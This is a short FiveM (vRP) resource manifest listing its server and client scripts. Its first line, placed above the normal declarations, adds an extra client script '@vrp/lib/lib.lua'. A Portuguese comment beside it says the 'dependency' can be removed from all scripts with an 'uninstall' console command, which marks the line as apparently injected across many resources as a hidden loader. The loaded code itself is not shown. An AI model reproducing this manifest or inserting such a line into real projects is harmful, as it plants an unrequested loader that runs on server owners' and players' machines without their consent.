client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_scripts {
	"@vrp/lib/utils.lua",
	"config.lua",
	"server.lua"
}

client_scripts {
	"@vrp/lib/utils.lua",
	"config.lua",
	"client.lua"
}              